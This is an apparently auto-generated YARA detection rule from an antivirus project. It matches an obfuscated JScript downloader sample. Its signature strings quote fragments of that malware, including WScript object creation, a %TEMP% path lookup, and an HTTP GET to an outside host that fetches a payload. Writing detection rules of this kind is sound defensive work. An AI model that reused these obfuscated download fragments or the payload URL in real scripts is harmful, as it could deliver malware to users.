rule sig_20160428_721a07aa43537db5b8eb13f605cad7ae {
  meta:
    description = "datamaliciousorder - file 20160428_721a07aa43537db5b8eb13f605cad7ae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8935ee140c38330e382fbbaf3a9a25f28a22808a4ee39178da255f0aec1c5c35"

  strings:
    $s1  = "function MscYpoIgmAhlZdyFxbXqy(YaxJvxYfyRouIrgKubBsu){IdzGwzToiKejCqbZdxSgh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function MscYpoIgmAhlZdyFxbXqy(YaxJvxYfyRouIrgKubBsu){IdzGwzToiKejCqbZdxSgh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EgdPqzMkqXmgHkgEmyExg() {return IdzGwzToiKejCqbZdxSgh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var IdzGwzToiKejCqbZdxSgh = function RhyStxNjgTdpRyqFewMir() {return RiwJreQiqCvgIlaZxbQtr[CtiNsfFkoNwzUwpVmxKgb](\"WScript\"+\"" ascii
    $s5  = "var RiwJreQiqCvgIlaZxbQtr = this[\"WScript\"];" fullword ascii
    $s6  = "var IdzGwzToiKejCqbZdxSgh = function RhyStxNjgTdpRyqFewMir() {return RiwJreQiqCvgIlaZxbQtr[CtiNsfFkoNwzUwpVmxKgb](\"WScript\"+\"" ascii
    $s7  = "function EgdPqzMkqXmgHkgEmyExg() {return IdzGwzToiKejCqbZdxSgh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "function IbsRirKskPmsXhiXrbXkq(AskWruLouVbgMdgIvmKrk, ZknGiuEboJxcDgjGrfCah){NbkXinOxsQzkGfvOumVdd = NbkXinOxsQzkGfvOumVdd * 1; " ascii
    $s9  = "function GhvZkuKauQlvZzpVwtBtu(){return DowVrpKllXijOinJtbPhj + \"\";};" fullword ascii
    $s10 = "return AskWruLouVbgMdgIvmKrk - ZknGiuEboJxcDgjGrfCah;};" fullword ascii
    $s11 = "if (YidTffTulRdtHyhQwoHdq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function KdiKqhEarZwkThbLzsYcm() {return ((FdhRytTxrEmrGrkKrxGge == true) && (FdhRytTxrEmrGrkKrxGge == YdbXlqVfkIsbRmuCrhYof)) ?" ascii
    $s13 = "YidTffTulRdtHyhQwoHdq[KthBvvVaxUzkWzcAkoFqo](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s14 = "function KdiKqhEarZwkThbLzsYcm() {return ((FdhRytTxrEmrGrkKrxGge == true) && (FdhRytTxrEmrGrkKrxGge == YdbXlqVfkIsbRmuCrhYof)) ?" ascii
    $s15 = "var AehQjpMamPwcMgkJliBbp = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "function NxtLtaVrvUtjScsGofPqh(MfhOlzVivDfzNtaXraQnp) {var JkhHmyWjsInvQsrLxkDit = (1, 2, 3, 4, 5, MfhOlzVivDfzNtaXraQnp); retur" ascii
    $s17 = "}while (VqmUsbEphTqnRadNoiDqo);" fullword ascii
    $s18 = "var YdbXlqVfkIsbRmuCrhYof = false;" fullword ascii
    $s19 = "YdbXlqVfkIsbRmuCrhYof = true; " fullword ascii
    $s20 = "function IbsRirKskPmsXhiXrbXkq(AskWruLouVbgMdgIvmKrk, ZknGiuEboJxcDgjGrfCah){NbkXinOxsQzkGfvOumVdd = NbkXinOxsQzkGfvOumVdd * 1; " ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}